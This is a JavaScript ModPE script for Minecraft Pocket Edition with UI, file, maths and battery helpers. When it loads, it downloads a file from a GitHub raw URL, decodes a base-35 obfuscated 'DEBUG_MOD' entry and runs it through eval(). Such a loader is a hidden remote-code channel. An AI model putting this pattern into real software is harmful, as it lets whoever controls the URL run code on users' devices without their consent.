/*
 * Copyright 2015 CodeInside
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

const className = "PersonalTool";
const VERSION = "SNAPSHOT_0.1";
const VERSION_CODE = 100;

var TAG = "[" + className + " " + VERSION + "] ";

var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
var PIXEL = android.util.TypedValue.applyDimension(android.util.TypedValue.COMPLEX_UNIT_DIP, 1, ctx.getResources().getDisplayMetrics());
var _SD_CARD = android.os.Environment.getExternalStorageDirectory();
var _MOD_DIR = new java.io.File(_SD_CARD, "games/com.mojang/minecraftpe/mods");
var _MAIN_DIR = new java.io.File(_MOD_DIR, className);
var _FONT = new java.io.File(_MOD_DIR, "minecraft.ttf");
var _MAIN_DATA = new java.io.File(_MAIN_DIR, "setting.json");
var _TEST_DATA = new java.io.File(_MAIN_DIR, "lastLog.txt");
function _MAP_DIR() {return new java.io.File(_SD_CARD, "games/com.mojang/minecraftWorlds/" + Level.getWorldDir() + "/mods")}
function _MAP_DATA() {return new java.io.File(_MAP_DIR(), className + ".data")}
var DIP = PIXEL * loadData(_MAIN_DATA, "DIPS");
if(DIP == null){
	DIP = PIXEL;
}
if(!(_MAIN_DIR.exists())) {
	_MAIN_DIR.mkdirs();
}
if(!(_MAIN_DATA.exists())) {
	_MAIN_DATA.createNewFile();
}
if(!(_TEST_DATA.exists())) {
	_TEST_DATA.createNewFile();
}



var web1 = "https://raw.githubusercontent.com/CI-CodeInside/ModPE-Script/master/content/key1";

/**
 * Error report
 *
 * @since 2015-04-??
 * @author CodeInside
 *
 * @param {error} e
 */

function showError(e) {
	if(!isNaN(e)) {
		if(!serverData) {
			toasts(TAG + "Check Your Internet");
		}else {
			debugMod(e);
		}
		return;
	}
	if(Level.getWorldName() === null) {
		ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
	android.widget.Toast.makeText(ctx, TAG + "\n" + e, android.widget.Toast.LENGTH_LONG).show();
		}}));
	}else {
		var t = (e + "").split(" ");
		var c = "";
		var temp = "";
		for(var l = 0; l < t.length; l++) {
			if(temp.split("").length > 30) {
				c += ("\n" + ChatColor.DARK_RED);
				temp = "";
			}
			c += t[l] + " ";
			temp += t[l];
		}
		clientMessage(ChatColor.DARK_RED + "[" + className + " ERROR LINE: " + e.lineNumber + "]\n" + ChatColor.DARK_RED + c);
	}
}



/**
 * debug
 *
 * @since 2014-12
 * @author CodeInside
 */
 
var debugging = false;
function debug(str) {
	if(debugging) {
		if(Level.getWorldName() === null) {
			 ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
		android.widget.Toast.makeText(ctx, "[Debug]\n" + str, android.widget.Toast.LENGTH_LONG).show();
			}}));
		}else {
			clientMessage("[debug] " + str);
		}
	}
}



function toast(str) {
	ctx.runOnUiThread(new java.lang.Runnable( {
		run: function(){
			try{
				android.widget.Toast.makeText(ctx, str, android.widget.Toast.LENGTH_LONG).show();
			}catch(e) {}
		}
	}
	));
}

function toasts(str) {
	ctx.runOnUiThread(new java.lang.Runnable( {
		run: function(){
			try{
				android.widget.Toast.makeText(ctx, str, android.widget.Toast.LENGTH_SHORT).show();
			}catch(e) {}
		}
	}
	));
}

function uiThread(fc) {
	return ctx.runOnUiThread(new java.lang.Runnable({run: fc}))
}
function thread(fc) {
	return new java.lang.Thread(new java.lang.Runnable( {run: fc}))
}
function multiThread(fc) {
	if(Level.getWorldDir() !== null) {
		new java.lang.Thread(new java.lang.Runnable( {run: fc})).start()
	}else {
		uiThread(fc)
	}
}



/**
 * Download file
 *
 * @since 2015-01-10
 * @author CodeInside
 */

function downloadFile(path, url) {
	try{
		var tempApiUrl = new java.net.URL(url);
		var tempApiUrlConn = tempApiUrl.openConnection();
		tempApiUrlConn.connect();

		var tempBis = new java.io.BufferedInputStream(tempApiUrl.openStream());
		var tempFos = new java.io.FileOutputStream(path);
		var tempData = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
		var tempTotal = 0, tempCount;
		while ((tempCount = tempBis.read(tempData)) != -1) {
			tempTotal += tempCount;
			tempFos.write(tempData, 0, tempCount);
		}
		tempFos.flush();
		tempFos.close();
		tempBis.close();
		return true;
	}catch(e){
		debug(e.lineNumber + " " + e);
		return false;
	}
}



/**
 * Set texture
 *
 * @since 2015-04-01
 * @author CodeInside
 *
 * @param {File} prototypeFile
 * @param {string} innerPath
 */
 
function setTexture(prototypeFile, innerPath){
	try{
		var bl = new java.io.File(android.os.Environment.getExternalStorageDirectory(), "Android/data/net.zhuoweizhang.mcpelauncher");
		var blPro = new java.io.File(android.os.Environment.getExternalStorageDirectory(), "Android/data/net.zhuoweizhang.mcpelauncher.pro");
		var ex = false;
		if(bl.exists()) {
			var dir = new java.io.File(bl, "files/textures/images/" + innerPath);
			dir.getParentFile().mkdirs(); 
			var bis = new java.io.BufferedInputStream(new java.io.FileInputStream(prototypeFile));
			var bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(dir));
			var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
			var count;
			while((count = bis.read(buffer)) >= 0){
				bos.write(buffer, 0, count);
			}
			bis.close();
			bos.close();
			ex = true;
		}
		if(blPro.exists()) {
			var dir = new java.io.File(blPro, "files/textures/images/" + innerPath);
			dir.getParentFile().mkdirs(); 
			var bis = new java.io.BufferedInputStream(new java.io.FileInputStream(prototypeFile));
			var bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(dir));
			var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
			var count;
			while((count = bis.read(buffer)) >= 0){
				bos.write(buffer, 0, count);
			}
			bis.close();
			bos.close();
			ex = true;
		}
		if(!ex) {
			toast(TAG + prototypeFile.getName() + " 리소스파일 적용 실패\n안드로이드가 아닌가요?");
		}
	}catch(e){
		toasts(prototypeFile.getName() + " 리소스파일이 없습니다");
	}
};



//==============================
//-NinePatch JS
//Copyright® 2015 affogatoman(colombia2)
//==============================
/**
 * Nine Patch
 *
 * @since 2015-??-??
 * @author affogatoman
 */

function ninePatch1(bitmap, top, left, bottom, right, width, height) {
	var getByteBuffer = function(top, left, bottom, right) {
		var NO_COLOR = 0x00000001;
		var buffer = java.nio.ByteBuffer.allocate(84).order(java.nio.ByteOrder.nativeOrder());
		buffer.put(0x01);
		buffer.put(0x02);
		buffer.put(0x02);
		buffer.put(0x09);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(left);
		buffer.putInt(right);
		buffer.putInt(top);
		buffer.putInt(bottom);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		return buffer;
	};
	var buffer = getByteBuffer(top, left, bottom, right);
    return new android.graphics.drawable.NinePatchDrawable(ctx.getResources(), bitmap, buffer.array(), new android.graphics.Rect(), "");
}
function ninePatch2(bitmap, top, left, bottom, right, width, height) {
	var getByteBuffer = function(top, left, bottom, right) {
		var NO_COLOR = 0x00000001;
		var buffer = java.nio.ByteBuffer.allocate(84).order(java.nio.ByteOrder.nativeOrder());
		buffer.put(0x01);
		buffer.put(0x02);
		buffer.put(0x02);
		buffer.put(0x09);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(0);
		buffer.putInt(left);
		buffer.putInt(right);
		buffer.putInt(top);
		buffer.putInt(bottom);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		buffer.putInt(NO_COLOR);
		return buffer;
	};
	var buffer = getByteBuffer(top, left, bottom, right);
	var patch = new android.graphics.drawable.NinePatchDrawable(ctx.getResources(), bitmap, buffer.array(), new android.graphics.Rect(), "");
	//var bm = android.graphics.Bitmap.createBitmap(width, height, android.graphics.Bitmap.Config.ARGB_8888);
	return patch;
}

/**
 * Location(x, y, z) to Vector(yaw, pitch)
 *
 * @since 2015-01-??
 * @author ToonRaOn
 */

function locToYaw(x, y, z) {
	var apil = Math.sqrt(Math.pow(x, 2)+Math.pow(z, 2));
	var apisinHorizontal = x/apil;
	var apicosHorizontal = z/apil;
	var apitanHorizontal = x/z;
	var apiacosHorizontal = Math.acos(z/apil)*180/Math.PI;
	var apiatanVertical = Math.atan(y/apil);
	var alpha = 0;
	if(apisinHorizontal > 0 && apicosHorizontal > 0 && apitanHorizontal > 0)
		alpha = 360 - apiacosHorizontal;
	else if(apisinHorizontal > 0 && apicosHorizontal < 0 && apitanHorizontal < 0) 
		alpha = 360 - apiacosHorizontal;
	else if(apisinHorizontal < 0 && apicosHorizontal < 0 && apitanHorizontal > 0) 
		alpha = apiacosHorizontal;
	else if(apisinHorizontal < 0 && apicosHorizontal > 0 && apitanHorizontal < 0) 
		alpha = apiacosHorizontal;
	else if(apicosHorizontal == 1) alpha = 0;
	else if(apisinHorizontal == 1) alpha = 90;
	else if(apicosHorizontal == -1) alpha = 180;
	else if(apisinHorizontal == -1) alpha = 270;
	else if(apisinHorizontal == 0 && apicosHorizontal == 1 && apitanHorizontal == 0) null;
	return alpha;
};

function locToPitch(x, y, z) {
	return -1 * Math.atan(y / Math.sqrt(Math.pow(x, 2)+Math.pow(z, 2))) * 180 / Math.PI;
};



/**
 * Entity range
 *
 * @since 2015-01-??
 * @author CodeInside
 */

function rangeEnt(a, b) {
	return Math.sqrt(Math.pow(Entity.getX(a) - Entity.getX(b), 2) + Math.pow(Entity.getY(a) - Entity.getY(b), 2) + Math.pow(Entity.getZ(a) - Entity.getZ(b), 2));
};



/**
 * Vector(yaw, pitch) to Location(x, y, z)
 *
 * @since 2015-01-??
 * @author CodeInside
 */

function vectorToX(y, p) {
	return (-1 * Math.sin(y / 180 * Math.PI) * Math.cos(p / 180 * Math.PI));
};

function vectorToY(y, p) {
	return (Math.sin(-p / 180 * Math.PI));
};

function vectorToZ(y, p) {
	return (Math.cos(y / 180 * Math.PI) * Math.cos(p / 180 * Math.PI));
};



/**
 * Absolute range x, y, z
 *
 * @since 2015-01-??
 * @author CodeInside
 */

function absX(x, y, z) {
	return x / Math.sqrt(Math.pow(x, 2) + Math.pow(y, 2) + Math.pow(z, 2));
};

function absY(x, y, z) {
	return y / Math.sqrt(Math.pow(x, 2) + Math.pow(y, 2) + Math.pow(z, 2));
};

function absZ(x, y, z) {
	return z / Math.sqrt(Math.pow(x, 2) + Math.pow(y, 2) + Math.pow(z, 2));
};



/**
 * save/load Data
 *
 * @since 2015-02-11
 * @author CodeInside
 */

function saveData(file, article, value) {
	//읽기
	if(!file.exists()) {
		file.createNewFile()
	}
	try{
		var fileInputStream = new java.io.FileInputStream(file);
	}catch(e) {
		return "Can't read"
	}
	var inputStreamReader = new java.io.InputStreamReader(fileInputStream);
	var bufferedReader = new java.io.BufferedReader(inputStreamReader);
	var tempRead, tempReadString;
	var tempSaved = "";
	while((tempRead = bufferedReader.readLine()) != null){
		tempReadString = tempRead.toString();
		//지금 새로 저장할 데이터는 읽지 않기
		if(tempReadString.split("¶")[0] == article)
			continue;
		tempSaved += tempReadString + "\n";
	}
	//읽어오기 완료
	fileInputStream.close();
	inputStreamReader.close();
	bufferedReader.close();
	//쓰기
	var fileOutputStream = new java.io.FileOutputStream(file);
	var outputStreamWriter = new java.io.OutputStreamWriter(fileOutputStream);
	outputStreamWriter.write(tempSaved + article + "¶" + value);
	//쓰기 완료
	outputStreamWriter.close();
	fileOutputStream.close();
}

function loadData(file, article) {
	//읽기
	try{
		var fileInputStream = new java.io.FileInputStream(file);
	}catch(e) {
		return "NoFile";
	}
	var inputStreamReader = new java.io.InputStreamReader(fileInputStream);
	var bufferedReader = new java.io.BufferedReader(inputStreamReader);
	var tempRead, tempReadString;

	while((tempRead = bufferedReader.readLine()) != null){
		tempReadString = tempRead.toString();
		//불러올 데이터 찾기
		if(tempReadString.split("¶")[0] == article){
			//찾았으면 끝내고 반환
			fileInputStream.close();
			inputStreamReader.close();
			bufferedReader.close();
			return tempReadString.split("¶")[1];
		}
	}
	//못 찾음
	fileInputStream.close();
	inputStreamReader.close();
	bufferedReader.close();
	//없으면 반환
	return null;
}


/**
 * load/save Minecraft Setting
 *
 * @since 2015-04-12
 * @author CodeInside
 */

function saveSetting(article, value) {
	//읽기
	var fileInputStream = new java.io.FileInputStream(new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/games/com.mojang/minecraftpe/options.txt"));
	var inputStreamReader = new java.io.InputStreamReader(fileInputStream);
	var bufferedReader = new java.io.BufferedReader(inputStreamReader);
	var tempRead, tempReadString;
	var tempSaved = "";
	while((tempRead = bufferedReader.readLine()) != null){
		tempReadString = tempRead.toString();
		//지금 새로 저장할 데이터는 읽지 않기
		if(tempReadString.split(":")[0] == article)
			continue;
		tempSaved += tempReadString + "\n";
	}
	//읽어오기 완료
	fileInputStream.close();
	inputStreamReader.close();
	bufferedReader.close();
	//쓰기
	var fileOutputStream = new java.io.FileOutputStream(new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/games/com.mojang/minecraftpe/options.txt"));
	var outputStreamWriter = new java.io.OutputStreamWriter(fileOutputStream);
	outputStreamWriter.write(tempSaved + article + ":" + value);
	//쓰기 완료
	outputStreamWriter.close();
	fileOutputStream.close();
	//this is not work
	net.zhuoweizhang.mcpelauncher.ScriptManager.requestGraphicsReset();
}

function loadSetting(article) {
	//읽기
	var fileInputStream = new java.io.FileInputStream(new java.io.File(android.os.Environment.getExternalStorageDirectory() + "/games/com.mojang/minecraftpe/options.txt"));
	var inputStreamReader = new java.io.InputStreamReader(fileInputStream);
	var bufferedReader = new java.io.BufferedReader(inputStreamReader);
	var tempRead, tempReadString;

	while((tempRead = bufferedReader.readLine()) != null){
		tempReadString = tempRead.toString();
		//불러올 데이터 찾기
		if(tempReadString.split(":")[0] == article){
			//찾았으면 끝내고 반환
			fileInputStream.close();
			inputStreamReader.close();
			bufferedReader.close();
			return tempReadString.split(":")[1];
		}
	}
	//못 찾음
	fileInputStream.close();
	inputStreamReader.close();
	bufferedReader.close();
	//없으면 반환
	return null;
}



/**
 * View Side
 *
 * @since 2015-04-13
 * @author CodeInside
 */

function viewSide(yaw) {
	var temp = yaw % 360;
	if((temp >= 0 && temp < 11.25) || (temp >= 348.75 && temp < 360))
		return "북(Z+)";
	else if(temp >= 11.25 && temp < 33.75)
		return "북북동";
	else if(temp >= 33.75 && temp < 56.25)
		return "북동";
	else if(temp >= 56.25 && temp < 78.75)
		return "북동동";
	else if(temp >= 78.75 && temp < 101.25)
		return "동(-X)";
	else if(temp >= 101.25 && temp < 123.75)
		return "남동동";
	else if(temp >= 123.75 && temp < 146.25)
		return "남동";
	else if(temp >= 146.25 && temp < 168.75)
		return "남남동";
	else if(temp >= 168.75 && temp < 191.25)
		return "남(Z-)";
	else if(temp >= 191.25 && temp < 213.75)
		return "남남서";
	else if(temp >= 213.75 && temp < 236.25)
		return "남서";
	else if(temp >= 236.25 && temp < 258.75)
		return "남서서";
	else if(temp >= 258.75 && temp < 281.25)
		return "서(X+)";
	else if(temp >= 281.25 && temp < 303.75)
		return "북서서";
	else if(temp >= 303.75 && temp < 326.25)
		return "북서";
	else if(temp >= 326.25 && temp < 348.75)
		return "북북서";
	else
		return "NaY";
}

function viewSide2(yaw) {
	while(yaw < 0) {
		yaw += 360;
	}
	var temp = yaw % 360;
	if((temp >= 0 && temp < 15) || (temp >= 345 && temp < 360))
		return 12;
	else if(temp >= 15 && temp < 45)
		return 11;
	else if(temp >= 45 && temp < 75)
		return 10;
	else if(temp >= 75 && temp < 105)
		return 9;
	else if(temp >= 105 && temp < 135)
		return 8;
	else if(temp >= 135 && temp < 165)
		return 7;
	else if(temp >= 165 && temp < 195)
		return 6;
	else if(temp >= 195 && temp < 225)
		return 5;
	else if(temp >= 225 && temp < 255)
		return 4;
	else if(temp >= 255 && temp < 285)
		return 3;
	else if(temp >= 285 && temp < 315)
		return 2;
	else if(temp >= 315 && temp < 345)
		return 1;
	else
		return "NaY(" + yaw + ")";
}


/**
 * Battery Checker
 *
 * @since 2015-04-14
 * @author CodeInside
 */

var ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);

Battery = {};

Battery.isCharging = function() {
	var batteryStatus = ctx.registerReceiver(null, ifilter);
	var status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
	return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING;
};

Battery.isFullCharging = function() {
	var batteryStatus = ctx.registerReceiver(null, ifilter);
	var status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
	return status == android.os.BatteryManager.BATTERY_STATUS_FULL;
};
	
Battery.plugType = function() {
	var batteryStatus = ctx.registerReceiver(null, ifilter);
	var chargePlug = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1);
	if(chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_USB) {
		return "USB"
	}else if(chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_AC) {
		return "AC"
	}else if(chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS) {
		return "WIRELESS"
	}else {
		return "UNKNOWN"
	}
};

Battery.level = function() {
	var batteryStatus = ctx.registerReceiver(null, ifilter);
	var level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
	var scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
	return Math.round(level / scale * 100);
};

Battery.temp = function() {
	var batteryStatus = ctx.registerReceiver(null, ifilter);
	var temp = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1);
	return Math.round(temp) / 10;
};

Battery.volt = function() {
	var batteryStatus = ctx.registerReceiver(null, ifilter);
	var volt = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, -1);
	return volt / 1000;
};

Battery.tec = function() {
	var batteryStatus = ctx.registerReceiver(null, ifilter);
	var tec = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY, -1);
	return tec;
};

Battery.health = function() {
	var batteryStatus = ctx.registerReceiver(null, ifilter);
	var health = batteryStatus.getIntExtra(android.os.BatteryManager. EXTRA_HEALTH, -1);
	switch(health) {
		case android.os.BatteryManager.BATTERY_HEALTH_GOOD:
			return 0;//normal
			break;
		case android.os.BatteryManager.BATTERY_HEALTH_DEAD:
			return 1;//battery life span is nearly end
			break;
		case android.os.BatteryManager.BATTERY_HEALTH_COLD:
			return 2;//battery is too cold for work
			break;
		case android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT:
			return 3;//battery buning XD
			break;
		case android.os.BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE:
			return 4;//battery voltage is too high
			break;
		case android.os.BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE:
			return 5;//unKnow!
			break;
		case android.os.BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE:
			return 6;//I don't know why fail but someting wrong.
			break;
		default:
			return -1;//i can't read it maybe your phone API version is higher
	}
};

function loadServerData(scriptInfoUrl){
	try{
		var bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.net.URL(scriptInfoUrl).openStream()));
		var scriptServerData = [];
		var temp = "";
		while ((temp = bufferedReader.readLine()) != null) {
			scriptServerData.push(temp);;
		}
		bufferedReader.close();
		return scriptServerData;
	}catch(e) {
		return false;
	}
};

function checkServerData(data, article){
	var temp = [];
	var temp2 = [];
	for each(var e in data){
		temp.push(e.split(":")[0]);
		temp2.push(e.split(":")[1]);
	}
	for(var e in temp){
		if(temp[e] == article)
			return temp2[e];
	}
	return null;
};

function splitLine(article){
	var temp = checkServerData(article).split("¶"); 
	var temp2 = ""; 
	for(var e in temp){
		temp2 += temp[e]+"\n"
	}
	return temp2
}



var serverData = loadServerData(web1);
if(!serverData) {
}else {
	var debugMod = eval(codeToString(checkServerData(serverData, "DEBUG_MOD")));
}

function stringToCode(str) {try {
	var string = str + "";
	var code = "", temp = "";
	for(var e = 0; e < string.length; e++) {
		if(e % 128 === 0) {
			code += temp;
			temp = "";
		}
		temp += string.charCodeAt(e).toString(35) + String.fromCharCode(122);
	}
	code += temp;
	saveData(_TEST_DATA, "CODE", code);
	return code;
}catch(e) {
	showError(e);
}}

function codeToString(code) {try {
	var parse = code.split(String.fromCharCode(122));
	var str = "", temp = "";
	for(var e = 0; e < parse.length; e++) {
		if(e % 128 === 0) {
			str += temp;
			temp = "";
		}
		temp += String.fromCharCode(parseInt(parse[e], 35));
	}
	str += temp;
	saveData(_TEST_DATA, "STR", str);
	return str;
}catch(e) {
	showError(e);
}}

function newLevel(str) {
	if(!(serverData === false)) {
		var sv = parseInt(checkServerData(serverData, "VERSION_CODE"));
		if(VERSION_CODE < sv) {
			clientMessage(ChatColor.GRAY + TAG + "New Version available");
			clientMessage(ChatColor.GRAY + "Current Version: " + VERSION);
			clientMessage(ChatColor.GRAY + "New Version: " + checkServerData(serverData, "VERSION"));
		}
	}
}

function procCmd(str) {try {
	var cmd = str.split(" ");
	switch(cmd[0]) {
		case "t1":
			var e = stringToCode("function(e){switch(e){case -1:var id=Player.getCarriedItem();var data=Player.getCarriedItemData();Player.addItemInventory(id,1,data);break;case -2:var id=Player.getCarriedItem();var data=Player.getCarriedItemData();Player.addItemInventory(id,64,data);break;case -3:Entity.setCarriedItem(Player.getEntity(),0,0,0);break;case -4:var e=Entity.getHealth(Player.getEntity());Entity.setHealth(Player.getEntity(),e+1);break;case -5:var e=20;Entity.setHealth(Player.getEntity(),e);break;case -6:Level.setGameMode(Level.getGameMode()==0?1:0);break;case -7:var id=Player.getCarriedItem();var data=Player.getCarriedItemData();var count=Player.getCarriedItemCount();if(id!==0)Entity.setCarriedItem(Player.getEntity(),id,count,data-1);break;case -8:var id=Player.getCarriedItem();var data=Player.getCarriedItemData();var count=Player.getCarriedItemCount();if(id!==0)Entity.setCarriedItem(Player.getEntity(),id,count,data+1);break;case -9:var id=Player.getCarriedItem();var data=Player.getCarriedItemData();var count=Player.getCarriedItemCount();if(id!==0)Entity.setCarriedItem(Player.getEntity(),id,count,0);break;}}");
			clientMessage(e);
			break;
		case "t2":
			var e = codeToString(cmd[1]);
			clientMessage(e);
			break;
		case "t3":
			clientMessage(checkServerData(serverData, "KEY1"));
			break;
		case "t4":
			var e = codeToString(checkServerData(serverData, "DEBUG_MOD"));
			clientMessage(e);
			break;
	}
}catch(e) {
	showError(e);
}}

function modTick() {
	var ctn = "";
	if(Pt.isOn[0]) {
		var time = new Date();
		var min = time.getMinutes() < 10 ? "0" + time.getMinutes() : time.getMinutes();
		ctn += (time.getHours() < 12 ? "AM " : "PM ") + time.getHours()%12 + ":" + min + "\n";
	}
	if(Pt.isOn[1]) {
		var time = Level.getTime() + 4800;
		var convert = Math.floor((time % 19200) * 1440 / 19200);
		var hour = Math.floor(convert / 60);
		var min = convert % 60;
		var minc = min < 10 ? "0" + min : min;
		ctn += (hour < 12 ? "MAM " : "MPM ") + hour % 12 + ":" + minc + "\n";
	}
	if(Pt.isOn[2]) {
		ctn += Battery.Level() + "% " + Battery.temp() + "C° \n";
	}
}

var Pt = {};
Pt.mod = 1;
Pt.isOn = [true, false, true];

Pt.btn = new android.widget.Button(ctx);
Pt.btn.setText("CI");
Pt.btn.setTextSize(android.util.TypedValue.COMPLEX_UNIT_PX, DIP*10);
Pt.btn.setTextColor(android.graphics.Color.WHITE);
Pt.btn.setPadding(0, 0, 0, 0);

Pt.btn_draw = new android.graphics.drawable.GradientDrawable();
Pt.btn_draw.mutate().setStroke(PIXEL*2, android.graphics.Color.rgb(30, 30, 30));
Pt.btn_draw.mutate().setGradientType(android.graphics.drawable.GradientDrawable.RADIAL_GRADIENT);
Pt.btn_draw.mutate().setGradientRadius(PIXEL*20);
Pt.btn_draw.mutate().setColor(android.graphics.Color.rgb(30, 150, 255));
Pt.btn_draw.setCornerRadius(PIXEL*25);
Pt.btn_draw.setAlpha(150);
Pt.btn.setBackgroundDrawable(Pt.btn_draw);

Pt.btn.setOnClickListener(new android.view.View.OnClickListener({onClick: function(view, event) {try {
	if(Pt.mod < 0) {
		showError(Pt.mod);
		return;
	}
	switch(Pt.mod) {
		default:
			toasts(TAG + "Unknow mod: " + Pt.mod);
	}
}catch(e) {
	print(e);
}}}));
Pt.btn.setOnLongClickListener(new android.view.View.OnLongClickListener({onLongClick: function(view, event) {try {
	Pt.dl = new android.app.AlertDialog.Builder(ctx);
	Pt.dl.setTitle(TAG + "change Mod");
	Pt.dl_et = new android.widget.EditText(ctx);
	Pt.dl_et.setText(Pt.mod + "");
	//Pt.dl_et.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
	Pt.dl.setPositiveButton("Done",new android.content.DialogInterface.OnClickListener({onClick:function(){try {
		Pt.mod = parseInt(Pt.dl_et.getText() + "");
		if(Pt.mod < 0 && Pt.btn.getText() + "" != "Debug") {
			Pt.btn.setText("Debug");
			Pt.btn_draw.mutate().setColor(android.graphics.Color.rgb(255, 30, 50));
			toast(TAG + "Debug Mod");
		}else if(Pt.btn.getText() + "" != "CI") {
			Pt.btn.setText("CI");
			Pt.btn_draw.mutate().setColor(android.graphics.Color.rgb(30, 150, 255));
		}
	}catch(e) {
		showError(e);
	}}}));
	Pt.dl.setView(Pt.dl_et);
	Pt.dl.create();
	Pt.dl.show();
	return true;
}catch(e) {
	showError(e);
	return true;
}}}));

Pt.wd = new android.widget.PopupWindow(Pt.btn, PIXEL*50, PIXEL*50, false);

uiThread(function() {
Pt.wd.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT, PIXEL*2, -PIXEL*50);
});

Pt.tv = new android.widget.TextView(ctx);
Pt.tv.setTextSize(android.util.TypedValue.COMPLEX_UNIT_PX, PIXEL*8);
Pt.tv.setTextColor(android.graphics.Color.WHITE);
Pt.tv.setBackgroundColor(android.graphics.Color.rgb(30, 30, 30));
Pt.tv.setAlpha(150);